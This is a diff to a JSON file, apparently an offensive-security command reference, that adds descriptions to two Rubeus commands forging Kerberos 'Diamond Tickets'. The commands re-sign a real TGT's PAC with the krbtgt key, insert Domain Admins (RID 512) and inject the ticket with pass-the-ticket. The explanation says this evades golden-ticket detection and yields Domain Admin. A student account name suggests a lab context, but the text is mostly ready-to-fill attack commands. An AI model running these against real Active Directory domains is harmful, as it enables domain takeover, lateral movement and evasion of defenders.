@@ -228,11 +228,13 @@
   "variations": [
     {
       "label": "AES key",
-      "command": "Rubeus.exe diamond /tgtdeleg /ticketuser:<user> /ticketuserid:<rid> /groups:512 /krbkey:<krbtgt_aes> /nowrap"
+      "command": "Rubeus.exe diamond /tgtdeleg /ticketuser:<user> /ticketuserid:<rid> /groups:512 /krbkey:<krbtgt_aes> /nowrap",
+      "description": "Uses Rubeus tgtdeleg to extract a usable TGT from the current logon session without needing elevation. Abuses the GSS-API to get an RC4-encrypted TGT even when AES keys are configured."
     },
     {
       "label": "Diamond ticket via credentials (/createnetonly)",
-      "command": "Rubeus.exe diamond /krbkey:<aes256_krbtgt> /user:student1 /password:<password> /enctype:aes /ticketuser:administrator /domain:<domain> /dc:<dc_host> /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt"
+      "command": "Rubeus.exe diamond /krbkey:<aes256_krbtgt> /user:student1 /password:<password> /enctype:aes /ticketuser:administrator /domain:<domain> /dc:<dc_host> /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt",
+      "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
     }
   ],
   "explain": "Forges a Diamond Ticket - request a real TGT and rewrite its PAC, so it carries valid DC signatures (evades golden-ticket detection):\n  diamond                   modify a legitimately issued TGT\n  /tgtdeleg                 obtain a real TGT for the current user without their password\n  /ticketuser:<user> /ticketuserid:<rid>   the user and RID the modified ticket is for\n  /groups:512              inject Domain Admins (RID 512) into the PAC\n  /krbkey:<aes256_key>     the krbtgt AES256 key to re-sign the PAC\n  /nowrap                   single-line output\nInject it (/ptt) and you are DA with a ticket that looks KDC-issued."
